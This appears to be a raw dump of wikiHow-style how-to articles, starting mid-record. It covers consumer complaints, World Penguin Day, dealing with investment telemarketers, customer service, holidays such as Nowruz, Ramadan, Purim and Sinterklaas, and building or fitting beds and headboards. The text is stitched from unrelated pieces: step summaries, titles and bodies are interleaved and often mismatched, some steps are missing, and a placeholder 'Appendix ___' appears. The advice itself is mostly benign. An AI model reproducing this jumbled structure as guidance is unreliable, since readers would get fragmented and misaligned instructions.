, Viciously tearing apart a business is a terrible way to get better customer service, and in some cases can lead to fines if your complaints are found to be unreasonably damaging or libelous.However, waiting a day to cool off and then writing a factual, constructive account of your problem on a review site like Yelp, or on the company's Facebook page can often trigger a quick and productive response from a company that wishes to make amends.


If the company does end up fixing your problem, be sure to update your review or comments to let people know.

Educate yourself about penguins.,
Dress in penguin colors.,
Take a trip to your local zoo.,
Watch penguin movies.,
Take action to help reduce global warming.,
Look at penguin pictures on the internet.,
Make a donation to a charity in honor of penguins.,
Tell your friends about penguins.",How to Celebrate World Penguin Day," There are a lot of websites that have a whole lot of information on penguins. There is a lot to learn about penguins, so you may be surprised at the facts that you learn.;
, You don't have to dress in a full blown penguin costume. Instead, dress in black and white, which are the two colors that are found on all penguins.


While most species of penguins have a black back and a white belly, some species of penguins do have other colors on them, such as orange and yellow. If you'd like, include some of those colors in your outfit for the day.

, Most zoos have a penguin exhibit, so you can see the penguins up close, and maybe even learn a bit more about them. While you're there, you can even visit other animals.

, There are many movies out there about penguins, a lot of them being cartoons. Some movies are:


Happy Feet (one and two)
Oddball
Mr Popper's Penguins
March of the Penguins
The Penguin King
Surf's Up
The Penguins of Madagascar

, Global warming is one of the main reasons that some species of penguins are becoming endangered. Instead of driving everywhere, try to carpool, use public transportation, walk, or bike as much as possible.

, There are plenty of penguin pictures online, some may make you smile, some may be pretty, and some may make you go ""wow"".

, There are many charities that you can make a donation to, and the money can go towards penguins. Some agencies even allow you to 'adopt' a penguin in your name for charity. Some of these agencies may even be in your area.

, Tell them about some cool facts you've found, let them know that some species of penguins are endangered.


Offer to carpool with them if you both need to go somewhere at some point during the day.

Start with this basic rule––if it sounds too good to be true––it is.,
If you insist on taking the call, listen carefully.,
Obtain complete, written information about any prospective investment, including annual reports and audited financial statements.,
Make sure the telemarketer identifies his or her employer.,
Learn to say no, and mean it.,
Now that you know about the “three call” technique, stay on your toes.,
Deflect telemarketers.,
End the call at any time.,
Bear in mind at all times that you have the absolute right to be treated with courtesy and respect.,
When a broker does reach you on the phone, whether at home or at work, they are required to identify themselves and their firm.,
Make sure that every investment you are considering has been registered with the Securities and Exchange Commission or your state.,
Know the daily activity of the stock.",How to Deal with Aggressive Investment Telemarketers," If a stranger on the phone promises you a “sure thing”, hang up and go back to work, to dinner or to bed, as the case may be. Most dishonest telemarketers, however, will not be quite so transparent. Do not ever make an investment during the initial telephone call or give the caller such personal information as your credit card or checking account number. Honest brokers require written authorization before they can withdraw money from your bank or charge your credit card.;
, Does the caller ask you about long-term objectives, investment history and risk tolerance? Legitimate brokers will ask these questions before making any recommendation. Take notes, and ask for detailed written materials that support the broker’s claims. 

, Review the company’s history. Has it been making money? Does it have revenues? If you are investing in a public offering, read the prospectus before you agree to buy. If you do not understand the documents, review them with an accountant or attorney that you know and trust.  If no documents are available, steer clear of the investment. 


Most public companies file quarterly financial statements and independently audited annual financial reports with the Securities and Exchange Commission. Those documents are available to the public through the SEC’s Edgar System.
If a company does not file audited financial reports, an investor cannot possibly verify its financial state or the broker’s representations. As a rule of thumb, if you cannot obtain independent information about a company, including audited financial statements, err on the side of caution, and find another investment. 

, If the name of the firm sounds familiar, be cautious. The Morgan Group is not Morgan Stanley. A.S. Goldmen was not Goldman Sachs. Clever, but duplicitous, brokers choose firm names that sound like better established firms. In reality, they have no relationship with the more established firm. When they recite their “distinguished” track record, don’t be confused. Once you obtain the name of the brokerage firm, check with the NASD and your state securities regulator to see if complaints have been filed against the firm by customers or regulators.  

, Then hang up. Aggressive telemarketers are oblivious to the word no. As long as they keep you on the phone, they have a chance to close the deal, so they will use every conceivable technique to keep you on the line. They can be alternately charming, funny, rude, profane or abusive. 

, Does the salesperson’s approach seem too calculated? Does the salesperson’s demeanor change if you hesitate to invest? Does your reticence tend to make them more pushy, or rude? If the answer is yes, end the conversation and the relationship.

, Even cold callers are required to play by the rules. In the securities industry this means that they can only call potential new customers at home between the hours of 8:00am and 9:00pm. Unfortunately, they are permitted to call you at work at any time of the day. But at least a good receptionist, switchboard operator or secretary will be able to screen those calls. Here’s the key:


When a stranger calls ,the secretary should always take a message rather than putting the call through to you directly. Nine times out of ten, the telemarketer will decline to leave a name or number, electing instead to try you again later. He or she may even try to be creative, pretending to be a friend or client, or feigning an emergency. So always ask who’s calling before you pick up the line. 
If the call does go through and you do not want to take it, inform the person that you are only accepting work calls and that you cannot talk. Do not agree to be called back later, simply end the call and hang up.

, If you do not want to be bothered by a stranger on the phone, you have the absolute right to end the conversation at any time––and not to be bothered by the caller again, ever. Simply say, ""I have no interest in speaking with you. Please place me on your ‘Do Not Call’ list.” Every brokerage firm is required to maintain a ""Do Not Call"" list. Once you are on that list, brokers from that firm may not call you. If they do, you should contact that firm’s Compliance Department immediately. You may also want to contact the Securities & Exchange Commission (SEC), NASD or your local state regulator.

, Don’t permit yourself to be cajoled or coerced. If the caller is abusive, nasty, profane or rude, hang up. If the firm is well known, and otherwise has a good reputation, contact its Compliance Department to file a complaint. If not, or if the Compliance Department does not respond to your satisfaction, file a complaint with your state securities regulator and the NASD. Or, you can take the easy road when the phone rings with a telemarketing call, and just hang up.

, Be sure you get the exact name of the firm and a telephone number for the caller. If you decide to continue with the conversation, pay careful attention. Make sure the broker asks you about your investment background and goals. Once you are satisfied that the salesperson has made a proper, thorough inquiry of your needs, conduct your own interview:


Ask for details of the broker’s background, investment philosophy and specialties.
Then check out the broker. The NASD will tell you whether a broker is registered to sell securities in your state, and if the broker (or his or her firm) has been named in customer arbitrations or regulatory proceedings.
Once you are satisfied that the broker is properly licensed, ask for written information on the brokerage firm.
Get references, and call them.

, 


If you are buying a stock, find out whether it trades on a recognized stock exchange and how easy it is to get price quotes. 
Find out if there is an active market for the stock. 

, Before you buy any stock (other than stock in an Initial Public Offering), you should follow its daily progress and watch its price movement. The daily activity of most listed securities can be found in the Wall Street Journal and other major newspapers. 


Penny stocks are a different story. Few newspapers publish price and volume information for penny stocks. Investors who want to follow these securities can find the information by using several online financial tracking services, including Yahoo! Finance and the website maintained by the National Quotation Bureau (NQB)  (See Appendix ___ for website information).

Use the Golden Rule when dealing with restaurant employees.,
Communicate any special needs clearly, before you are seated.,
Use appropriate body language.,
Ask questions before you order.,
Group your requests together.,
Be courteous, even if you have a complaint.,
Tip appropriately for the establishment.",How to Get Better Customer Service2," Always treat people the way you would like to be treated. Use respectful language, make eye contact with your server, and say ""please"" and ""thank you"" when making requests.

, If someone in your party has a food allergy, let both the host and your server know. If you have a physical condition that prevents you from sitting comfortably in a booth, politely but firmly make your preference known when you arrive, rather than at the time the staff tries to seat you.

, Servers pay attention to their customer's body language to determine when tables are ready to order, when customers have a request, when people have finished eating, and so forth. It’s important to send the right signals to get the kind of service your require.Put down your menu when you are ready to order. Servers assume that as long as people are still looking through the menu, they have not made a decision yet.
If you would like a drink refill, place your empty glass or cup at the edge of the table where the server can clearly see it.
If you have a problem with your meal or need something, stop eating and try to make eye contact with your server, or signal him with a quick wave.

, If there are certain ingredients you are avoiding, ask the waiter about their presence before ordering a new dish. If you aren't sure if you will like something, ask the server to describe it for you before making a decision. It's better to get information ahead of time than to wind up with something you don't like.

, You are likely to get better, more efficient service if the members of your party group their requests together. If someone flags the waiter down to ask for ketchup, ask your party if anyone else needs anything at the same time. The more you can plan ahead, and make special requests at the time you place your order, the more likely they will be efficiently accommodated., If something is amiss with your order, or a mistake was made, recognize that it was most likely not your server's fault and remain calm and clear when explaining the problem. Customers who complain gracefully are much easier to deal with and more likely to have their concerns addressed promptly by the staff.If your server does not respond appropriately to your complaint, calmly request that a manager come and speak with you.Be firm, but avoid making a scene.

, Tipping appropriately is always a good idea, but it is especially important if you plan to be a repeat customer at a restaurant. Don't badger your server and threaten to dock his tips if he makes mistakes. Do learn the appropriate tipping customs in the area where you are dining, as these vary widely by country and region, and tip accordingly."

Think about what you want before you call.,
Try to speak to a human.,
Escape the phone tree ASAP.,
Speak clearly and be polite.,
Ask to speak to a manager.,
Use the customer service chat option, instead.",How to Get Better Customer Service3," If you need information about the company, be clear about what you want to know. If you are calling to make a complaint, try to mentally summarize your issue before you call to make sure you can quickly and clearly report it over the phone. If you know what needs to happen to resolve the issue, be ready to explain that, as well.

, Automated phone trees have become an unfortunate and frustrating part of life, but there is often a way around them. Do some research online before you call to try and find a customer service number that leads directly to a human. Sites like gethuman.com and dialhuman.com maintain international listings for customer service lines that are staffed by actual people.You can also do a simple web search for the name of the company and ""customer service"".

, If you do get into a phone tree, try to get out of it as soon as possible by choosing an option for ""I have a different problem"" or ""representative,"" even if there are choices that do describe your issue.Dialing the 0 key will get you to an operator in many phone trees. Saying ""agent"" or ""representative"" will also override the phone tree in many cases.

, Remember that the person answering the phone is doing a difficult, often unpleasant job, and you can make it easier for her by remaining polite and upbeat, and speaking clearly and slowly enough to be easily understood., If the representative you are speaking with claims that he cannot help you with your problem, or if you cannot understand the representative due to a difficult accent or a bad connection, simply ask to speak to a manager. Be polite and firm in your request, and be prepared to re-explain your issue to the next person up the line., Phone representatives often make incorrect statements, or offer false promises that they cannot follow through on. By using online chat for customer service, you create a paper trail that can then be forwarded to management, should a problem arise. You also circumvent any problems you might have with unfamiliar accents or poor connections."

Return “giri” gifts with similar items, such as Poko or candy. Choose something special for a “honmei” gift, such as a purse or jewelry.If a woman gives you a “honmei” gift and you don’t share her feelings, it is customary to let her down gently by explaining your feelings in person or even in a note, and presenting her with a gift that equals the value of what she got for you., Marshmallows, chocolate, cookies, and other sweets are very popular gifts for White Day.Choose some delicious treats to show your affection for female friends. To make the gift even more meaningful, make the sweets yourself.

, White flowers such as lilies, peonies, and orchids are perfect White Day gifts. Alternatively, you can give a woman her favorite kind of flower to show how much you care., A soft, white stuffed animal is a great White Day gift for younger girls. A teddy bear is a popular choice, or you can choose her favorite animal., Perfume, body mist, lotion, scented soap, or candles are nice White Day gifts. Choose something with a sweet smell and a pretty label., White gold or platinum jewelry fits with the white theme. However, only present expensive gifts such as jewelry to that one lucky lady in your life, rather than a friend., This special day is the perfect opportunity to go out. Eat at a nice restaurant, go to the movies, or visit a museum or art gallery. Enjoy spending some time with the one you love on White Day.

Celebrate the last day of Nowruz as Sizdah Be-dar.",How to Celebrate the Persian New Year (Nowruz)," The most important part of every Nowruz is the special 7-Seen (Haft Sīn) tabletop (Sofreh) which includes 7 symbolic items all starting with the letter Seen (English translation:letter S) س in the Persian alphabet.The Haft-Seen items are:

Sabzeh (سبزه) – wheat, barley, mung bean or lentil sprouts growing in a dish - symbolizing rebirth.
Samanu (سمنو) – sweet pudding made from wheat germ – symbolizing affluence.
Senjed (سنجد) – dried oleaster Wild Olive fruit – symbolizing love.
Seer (سیر) – garlic – symbolizing the medicine and health.
Seeb (سیب) – apple – symbolizing beauty.
Somāq (سماق) – sumac fruit – symbolizing (the color of) sunrise.
Serkeh (سرکه) – vinegar – symbolizing old-age and patience.
Other symbolic items that may also appear on the Haft-Seen table are Divan-e Hafez, a Persian poetry book (like Shahname-ye Ferdowsi), a mirror, a goldfish in a bowl (represents life and the end of astral year-picas), a low brazier full of fire, a lamp sprays of cypress or pine, pomegranates, painted eggs, coins (as a symbol of wealth), candles for each member of the family, a bowl of water and finally wheat or bread.
In many historical sources states that ""Haft Seen"" was ""Haft Sheen""(seven SH) at the first and then it has changed. Nowadays, many Iranians set the Haft-Sheen table to remind the big and powerful Achaemenid empire of Iran. the symbolic items of Haft-Sheen are:Candles(Sham'), wine(Sharab), sweets(Shirini), honey(Shahd), bush(Shemshad), syrup(Sharbat) and candy branches(Shakhe nabat) or anemone(Shaghayegh);
, Cleaning the house is one of the customs of Nowruz. This can symbolize a fresh, new start. Some Persian people even buy new furniture for their house which is optional., On the last Wednesday of the year, Iranians celebrate Chahārshanbe Suri which symbolizes the purification of your winter blues. Neighbors gather together in the streets to make bonfires and jump over them while singing the traditional songs. Nowadays, young people would prefer to blow up fireworks. Many elders would encourage them to take part in the tradition., Nowruz is a fresh start, and you need to be very happy to celebrate it. As a belief of Iranians, if you smile during Nowruz then you'll smile for the whole year. If you don't smile, get ready for a not-really-good year. Be wise enough to count only the blessings, the friends, and the joys you’ve received in the past year., All Iranian communities, big or small, have a party in the afternoon till late at night to celebrate the New Year. In big cities, like Los Angeles, there are concerts performed by famous Persian singers. In smaller cities, the Iranian cultural society rent a place. There is usually a dance floor and sweets. The parties usually last late into the night with lots of dancing and merriment., It's a very common custom to buy new clothes before Nowruz in Persian countries and wear them for all the 13 days., There are 2 Santa Clauses in Persian New Year's celebration. Haji Firouz walks around the streets and plays his loud tambourine while singing traditional songs. His face and hands are painted black to represent soot from the fire. Amoo Nowruz, is the one who puts presents in good kids rooms as they're sleeping, waiting for their wishes to come true. Both wear a red cloak and a red felt hat., One of the best Nowruz customs is visiting relatives, especially elder ones. In the 13-days of bless, people will go and visit their old grandparents and other family members. Young kids and teenagers get a lot of money (called as Eydi) from the elders., During the 13-days, Iranians prepare for the occasion and get ready for the guests to come over. They eat the traditional meal “sabzi-polo-mahi” (salmon and spinach rice) together while wishing each other the best of luck for the New Year and saying “Norooz Pirooz” which means ""Happy Nowruz""., Sing the New Year's song with your family and share your happiness with them. The Persian new year's song:گشت گرداگرد مهر تابناك،ايران زمين/روز نو امد و شد شادی برون زندر كمين/ای تو يزدان، ای تو گرداننده ی مهر و سپهر/برترينش كن اين گاه و اين زمين/پاينده باد ايران شاد باد ايرانی

The English translation: The sun is shining all over our home, Iran/the new day came and happiness is with it/oh Lord, you are who owns the sky and sun's moves/please make the sun and earth at the best position right now/long live Iran and be happy Iranians.

, On the thirteenth day of the New Year, Iranians leave their houses to enjoy nature and have a picnic outdoors. This is part of the Sizdah Be-dar ceremony. They believe that if the 13th of Farvardin(the first month in Persian calendar) of a year is good, the whole year can be amazing! The greenery (Sabze) grown for the Haft-Seen setting and the goldfish are thrown away, particularly into running water. It is also customary for young single people, especially young girls, to tie the leaves of the greenery before discarding it, expressing a wish to find a partner. Furthermore, on the day of Sizdah Be-dar, there's a custom that you can simply lie. This is called Lie of the Thirteen, which is the process of lying to someone and making them believe it!"

, Hoist a flag outside your home, stick one on your vehicle or even wear one on (or as) your clothing. The flag is the most visible symbol of the holiday. It will probably look familiar—a large red cross on a white background. The cross refers to St. George’s role in the Crusades of the Middle Ages.You could also display the flag more subtly by wearing it on a button or patch.
St. George’s personal banner was later adopted as the national flag of England, so observing the holiday is a way of rejoicing in all things British., Incorporate some blue into your wardrobe to show that you’re staying in step with tradition.

Let the children celebrate.",How to Celebrate Sinterklaas (St. Nicholas Feast) in the Netherlands," This event takes place on the second Saturday of November. Sinterklaas usually arrives from Spain on a steamship. If the town is not situated near a canal or river, he may choose another form of transportation. On his arrival, the children will sing “Zie ginds komt de stoomboot”.“Zie ginds komt de stoomboot uit Spanje weer aan
Hij brengt ons Sint Nicholas, ik zie hem al staan
Hoe huppelt zijn paardje het dek op en neer
Hoe waaien de wimpels al heen en al weer
Zijn knecht staat te lachen en roept ons reeds toe
“Wie zoet is krijgt lekkers, wie stout is de roe!”
Your child will learn the song in daycare or school. If he or she attends neither, you can buy a CD of Sinterklaas songs at any CD store.
Sinterklaas will be greeted by the mayor, and sometimes he will be presented with the keys of the town. Next, Sinterklaas will mount a white stallion and take a trip through the city center, towards his temporary home in the city. The Zwarte Pieten - or Black Pete's, the helpers of Sinterklaas - will hand generous amounts of gingerbread nuts or ""kruidnoten"" to any child they meet on the way. Your child can hand over drawings or presents they have made for Sinterklaas.;
,


The home of Sinterklaas is open to visitors. Check the local media for opening hours.
Attend the meet and greet (or “zittingsmiddag”) at the mall. Your child may receive a small present and/or – again – a handful of gingerbread nuts. Information on when the meet and greet will be held will be displayed on billboards or can be found in the local media.

, Let them sing a Sinterklaas song.
This is called ""schoentje zetten"" (or setting the shoe) and it is done between the arrival of Sinterklaas and December 5th. Now is the time for children to receive some small presents.
Euro stores sometimes sell large bags of goodies that can be wrapped up separately to make nice gifts. Surprise eggs and chocolate letters make nice gifts as well.


Supermarkets and other stores usually offer the opportunity for setting the shoe. Children can obtain a coloring sheet from the store which (when decorated, cut out and glued together) forms a shoe. Leave the shoe at the store, and don't forget to write your child's name on it! Ask an employee at the store when the shoe can be collected. At the given day take home the shoe filled with candy.

, If your child participates in a sport or hobby, they will likely receive an invitation to celebrate Sinterklaas at the club. These parties take place before December 5th, because the actual celebration is considered a family night. The gift(s) your child will receive are donated by sponsors.
Older children (age 10 and up) may engage in a party that resembles Secret Santa. They will draw a name from a hat and buy a present for the person whose name they drew. The leader of the club will inform you how much you can spend on the gift.

This is sometime between January 21 and February 19 on the solar calendar.
, Tet is a huge celebration lasting three days. Families save money, store food, and plan far in advance for Tet, major holiday in Vietnam. The Vietnamese take extreme care to start the New Year out right. They buy new clothes, paint and clean their homes, cook three days worth of food, pay off all debts and make amends to rid themselves of all bad feelings. Cleaning is frowned upon during Tet because one would not want to sweep out any good luck. Digging and drawing water is also not allowed so the ground and water can enjoy the holiday., Food plays a major role in the Tet celebration. Tet is a time of excess, one does not enjoy Tet, one ""eats"" Tet.

Don't forget to give to those in need.",How to Celebrate Ramadan," If you celebrate Ramadan, you're not supposed to eat or drink from sunrise to sunset. That includes water, any type of food or liquid, and things like gum.Fasting isn't just about not eating. It's about learning to have sympathy with others, learning self-restraint, and giving to others in need.;
, Exceptions are made for people who can't fast. The elderly or those who are sick are exempt from fasting, as are pregnant and nursing mothers. Others who have strenuous occupations are exempt as well. Generally, you try to make days up later when you can't fast, but others also give to charity to help feed the hungry or volunteer at local nonprofits.Similarly, people who have conditions such as diabetes may find they are not able to fast, especially if you are a Type 1 diabetic.Really, it's up to you whether you think you can fast or not.

, Kids usually don't start fasting until puberty. A common age to start fasting is 15. However, some practice half or even whole days at a time in preparation for when they do fast. In some cases, a family member might offer an incentive of money or a treat as a reward for the number of days the children fast., Most Muslims also fast from certain behaviors during the month of Ramadan. From sunrise to sunset, you should refrain from things like smoking or having sex. In addition, you're supposed to take special care to watch your behavior during Ramadan, making sure you don't lie, cheat, get angry, or other things of that nature., Because you fast during the day, you must get up before the sun rises to eat your morning meal. Traditionally, this meal is called suhoor. It's also a good time to get hydrated for the day.Try eating some protein, as well as fiber-rich foods (think whole grains, fruits, and vegetables) to help keep you from getting too hungry throughout the day. If you're practicing halal, as well, make sure to buy halal meat and look for the halal symbols or kosher symbols on dairy and other products.

, It's customary during Ramadan to invite friends and family over to break the fast. Muslims and non-Muslims alike can join in the fun and community, so don't be afraid to throw your net wide. Also, the fast is usually broken with a dried date or two.The evening meal that breaks the fast is called the iftar.You can make foods such as falooda kulfi, baba ghanoush, halwa puri, or Adana kebab.

, Because iftar is a celebration, you can put up decorations during the month. Often, decorations involve any kind of moon and stars. Lanterns are also popular. Kids, especially, enjoy decorating the home with this symbols of the lunar calendar., ""Halal"" refers to what is forbidden in Muslim laws in general, but it is most often brought up in relation to food. Halal is similar to kosher in some ways, as they both require a specific way to kill the animal.Also, both forbid the eating of pork and (in some cases) shellfish. Though there are differences, looking for the kosher symbol on dairy and non-meat foods in non-Muslim countries is acceptable because it usually means the food doesn't contain a meat product, such as gelatin.

, Typically, you'll perform the prescribed five prayers a day that you would the rest of the year, including the fifth prayer after iftar. However, many Muslims (mostly Sunni) also pray an extra prayer during this time, called tarawih or taraweeh. This prayer is divided into four cycles, where you stand, bow, prostrate, and sit. During the standing period, you will read parts of the Qur'an.For this time of year, the Qur'an is divided into thirty parts. Therefore, you're essentially reading 1/30 of the Qur'an each night.
You can do these prayers at home, but you can also visit the mosque for prayers.

, Ramadan is a time of holiness and reflection, so you should consider visiting the mosque more during this time. The taraweeh is performed in most mosques every evening during Ramadan.Many mosques also provide food for breaking fast, if you prefer to eat at the mosque.
Some people even spend the last ten days of Ramadan solely in the mosque, devoting themselves to prayer.

, If you are able, you should give to those poorer than you. Generally, you give at least 2.5% of your assets (zakat-al-mal) during Ramadan. You can donate to those you know personally who are in need of assistance. However, if you don't know someone to donate to, you can also give to local charities and food banks.Typically, you also give another smaller amount (zakat-al-fitr) before the beginning of the final festival in Ramadan, Eid ul Fitr.

However, how much you give is always up to you.

, You can assist at a food bank, for instance, or serve food at a soup kitchen. Where you volunteer is up to you, but charity is one of the five pillars of Islam. Therefore, it's a good idea to practice it during Ramadan., Because Ramadan is based on a lunar calendar, the new moon marks the start of the Eid al Fitr. This signifies the end of Ramadan, and it is a three-day festival that includes eating a daytime meal., This time is also a period where you offer thanks to Allah for helping you practice self-restraint while you were fasting. You're also thanking Allah for the strength to fast., Consider buying a new outfit for this celebration. Children, especially, usually get new clothes for this festival, but you can join in the fun, too. If you don't want to buy a new outfit, dress up in your fanciest outfit for when you go visiting., If you didn't decorate for iftar, decorating for Eid al Fitr can be fun, especially if you're going to have family visit. Lanterns, moons, and stars are traditional, but you can decorate however you see fit., Some Muslims exchange gifts with all their friends and family, but the focus is really on the kids. Kids usually get sweet treats, candies, and gifts of money during this time period., Now is a great time to go visit family and friends, as well as have family and friends to your house. It's easier to travel now that you don't have to fast, and it's a good way to celebrate. Typically, you'll go visit your parents, kids, or other family members, as well as friends you haven't seen in a while., Though the fasting has drawn to a close, charity is still important. In fact, many consider it more important during Eid al Fitr. Consider giving money to those in need and volunteering your time to help others."

Cook traditional foods.,
Play Purim music.,
Dress up.,
Fill your house with decorations.,
Invite your friends and family.,
Serve food and wine.",How to Celebrate Purim," If you are religious, fast on the day preceding Purim. This is known as the Fast of Esther. It is observed by religious Jews, and it commemorates the three-day fast Queen Esther and the Jews undertook prior to speaking to the king about saving the Jews in the Purim story. The fast ends at nightfall, though if Purim falls on a Saturday, the fast is observed on the Thursday before. Fast in a healthy manner. While preparing for the fast, you should avoid consuming junk foods, alcohol, and coffee. Refrain from chewing gum as well, since it may lead to discomfort due to heartburn.Try to drink as much as water as possible. You should stay hydrated, as the human body should not go many hours without drinking water.Give yourself a few days after your fast before you eat a big meal. Pacing yourself can make the return to eating food more palatable.;
, This is read once at night and once during the day of Purim. The reading usually takes less than an hour to finish. When the name Haman is mentioned, it is customary to make a lot of noise to ""blot"" out the evil name. , The requirement is to give at least two gifts to the poor. These gifts must be generous, and they should be given during the daytime. Synagogues often take money as well which they then use to provide services or to help out those who need assistance in the community.Some common gifts are money, drink, and food.If you know of any individuals in your community who could use an extra hand, you may approach them and say: ""I am celebrating Purim and wondered if you would like this food basket.""
You could also say: ""It must be cold at night - would you like this blanket?""

, An essential part of celebrating Purim includes giving prepared food to your Jewish friends. This could be as simple as baking cookies and gifting them to your friends. It is customary to deliver the food through a third person.You can ask your relatives or children to deliver them. However, you can also do this personally if need be. This should be done during the day., For example, you can try to Make Hamantaschen. Hamantaschen is a delicious pastry with three corners. According to myth, Haman, the main antagonist in the Book of Esther, donned a hat with three corners. This dish serves as a mockery to Haman's arrogance. Kreplach, which is a dumpling soup, is also served on Purim. Some argue that the dumpling's dough symbolizes “knowledge” and the meat inside represents “emotion.” , Throw on some tunes and enjoy the joyful atmosphere. You can find Purim music online by searching for Purim songs on YouTube or Spotify. Songs like Chag Purim or Shoshanas Yaakov have joyful lyrics about the holiday of Purim and are classic choices., Dressing up on Purim isn’t just for children. Adults can dress up on Purim too - in fact, many Purim parties are masquerade parties. The reason for this custom is to show that God’s hands were behind the Purim miracle but were masked as natural events.Therefore, create costumes based on celebrated characters in the story. For example, you or your child could dress up as the Biblical figures Mordecai or Esther.Costumes don’t need to be explicitly religious. You may want to dress up as a superhero or a movie character. Consider the specific event you'll be attending and use your best judgment to determine whether this is a good choice.

, You can put up your usual party decorations, so feel free to throw up bright, colorful streamers and balloons. You can also lay tzedakah boxes, or boxes for charity donations, on the table. After the event, you can donate the money collected to your synagogue or to a local charity you support.If you have children, you could give them a decorating task: to draw hamantaschen, cut out the drawings, and tape them with washi tape around the house.

, This is a holiday where everyone can participate. After all, Purim is a celebration of community. Don’t be afraid to invite people who may not share your faith, especially if the focus of the event is not religious but solely celebratory. You may want to give them a few days' notice. If you are planning a large family get-together, then you should send out invites a few weeks in advance.


Briefly explain the holiday to your guests. They should know it is religious in nature. At the same time, you may choose to tone down the religious elements and focus instead on celebrating the history of the Jewish people, in which case certain guests may feel more comfortable attending. Purim is a time for education as well as remembrance.

, As it is a joyous occasion, dishes, such as the above mentioned hamantaschen and kreplach, and wines can be served. The meal should begin in the afternoon (at around 5 or 6pm) and be completed by nightfall. After the meal, you might invite guests to share their favorite Purim memories or stories."

, Buy four large 2x2 pieces of lumber. Screw them into the bed frame, or attach them. They should be standing upwards now, surrounding your bed.

, Attach curtain rods between the posts.

, This should ideally be a see-through, or translucent fabric. Ideally, the fabric must be cut so that it covers the whole top of the canopy made by the lumber, as well as the front and back. The sides should be saved for curtains. Measure the areas and cut the fabric accordingly.

, If you don't want to bother, cover both sides with the canopy just like you would for the front and back. In the sides, however, make a cut in the fabric to serve as curtains, and hem the sides. The edges should also be hemmed too.

, You can also sew the hem with lace, if you'd like.

, Enjoy your new bed!

Measure between screw holes before buying.,
Determine how wide your headboard should be.,
Decide how high it should be.",How to Fit a Bed Headboard1," Divan beds are designed as backless, but they often include screw holes for headboards to be added later.Before purchasing a new headboard, check how far apart its struts need to be in order to fit your bed. Check the back of your bed for bolts or screw holes on either side and measure the distance between them.


Larger beds may have more than one hole in a vertical line, but measuring these aren’t necessary. You want the horizontal distance from a hole toward one side of the bed to one that’s level with it toward the other.
This step is not necessary if you plan to mount your headboard to the wall.;
, First, measure from one corner of its head to the other to find out its width. Next, decide if you want the headboard to back any surrounding furniture, such as matching nightstands. If so, measure the distance between the bed and those pieces’ farthest sides. Add those figures to your total width.


Headboards typically project anywhere up to three inches (7.6 cm) past the corner of the bed’s head.If you are backing other furniture as well, apply this rule to their farthest sides from the bed.

, Measure the length of the bed, from its head to its foot. Also measure its height, including the mattress and any toppers. Use these figures to determine how high above the top of your mattress your headboard should rise.Standard headboards stand roughly 14 inches (35.5 cm) higher than the top of the mattress.
Extra tall headboards should be less than the bed’s length.

Line up one bed rail with one end piece of your bed frame.,
Insert the nut, which will look like a barrel with a hole through the middle, into the appropriate-sized hole in the face of the bed rail.,
Slide the bolt through the hole on the opposite side of the end piece until it bumps against the nut.,
Use your screwdriver to rotate the barrel nut until the hole is lined up with the end of your bolt.

,
Hold the barrel nut in position with your screwdriver.",How to Install Bed Bolts1," In many cases, there will be a slit in the end piece where you can insert the nub at the end of the bed rail.;
, The length of the barrel nut will run perpendicular to the length of the bed rail.


Insert the nut so that the ""plus"" of the screwdriver grooves faces outward and is visible.

, It will run through the hole in the end piece and into a hole in the end of the bed rail.

,, Simultaneously use your hex wrench to turn the nut, screwing the bolt into position. Continue tightening until the bolt is fully seated.

Measure your mattress.,
Subtract 12 inches (30 cm) from the length and width of your mattress to get the measurements for the base of your platform.,
Gather your materials.,
Build the base of the platform using either 2-by-8- or 2-by-10-foot boards.,
Cut the boards to the correct size for the base and arrange them on their edges in a rectangle.,
Assemble the base using wood screws.,
Place short pieces of board in the gaps between cross pieces and screw them in place to help stabilize the base.,
Allow time for the glue to dry.,
Assemble the platform in the same manner as the base, remembering that the length and width of the platform will be 12 inches greater than the base.








,
Set the platform on top of the base, center it carefully, and screw it to the base wherever the long boards of the platform meet the long board of the base.,
Fit a sheet of medium density fiberboard to the top of the platform.,
Attach edging to the fiberboard sheet to hide the the unfinished edges.








,
Allow time for the glue to dry, cover the screw heads with wood putty, then stain or paint the platform.








,
Finished.








",How to Build a Platform Bed," Your platform should be 1 inch wider and 1 inch (2 to 3 cm) longer than your mattress, so when you put the mattress on the finished platform bed, there will be 1/2 inch (1 cm) of platform on each side.






;
, The base should be smaller than the platform to keep you from stubbing your toes on the base when you get into bed.








, In addition to the wood for your platform bed, you will need an assortment of tools and supplies, including painting or staining supplies.








, Consider things such as baseboard heaters, outlets and the thickness of your mattress when deciding how tall to build the platform.








, Measure and cut 2 or 3 crosspieces, depending on the size of the base, to fit inside the rectangle. Space the crosspieces at even intervals.








, Drill pilot holes for the screws in each board and apply carpenter's glue to the cut ends to help seal the joints. Use a carpenter's square to make sure all the boards meet at 90-degree angles.








, Stagger the pieces evenly.








, Cover the screw heads with wood putty, then paint or stain the outside of the base.








,, Use long deck screws, remembering to drill pilot holes to keep the wood from splitting.








, Carefully apply carpenter's glue to the edges of the boards and screw the sheet to the platform, taking care to make sure the screws don't split the fiberboard.

Purchase fabric, batting and large buttons at a fabric or craft store.,
Cover the headboard with the desired number of layers of batting.,
Trim the edges of the batting on the back of the headboard to 4 inches (10 cm).,
Drape your chosen fabric over the headboard.,
Pull the fabric tight and staple the fabric to the plywood.,
Thread a needle with fishing line or heavy thread and push it through the first hole and out through the batting and fabric from the back to the front.,
Attach the button.,
Repeat the button process with each of the holes until your headboard is tufted in the desired pattern.

,
Secure the headboard to the wall behind your bed.",How to Make an Upholstered Headboard2," Make sure you have enough fabric to more than cover one side of the headboard.


Choose a fabric that will stand up to wear, especially if the headboard will see a lot of use as a backrest.
Batting is sold in bags, and you will need 4 bags for 3 or 4 layers.

, The batting should extend about 1 foot (30 cm) over the edge on each side.


It will take at least 3 layers of batting to create a soft headboard. Adding more layers than that creates extra softness and a more pronounced look.

, Staple the batting to the back of the plywood with a staple gun.

, Tuck the edges under, and flip the headboard so the back faces up.

, The fabric should cover the batting on the back completely. Once it is secured, trim away any excess fabric with scissors.

, Then run the needle through a large button.

, You can do this with either one or two drilled holes, depending on what you decided. Whichever you choose, make sure you pull the button tight to create the tufted look in the batting. Here are the two methods.


To tuft a headboard with two holes drilled for each button, simply loop the needle back through another hole in the button. Then push it back through the second hole in the plywood and pull it tight. Loop the needle back through the two holes a couple of times more, and then tie off the thread securely.
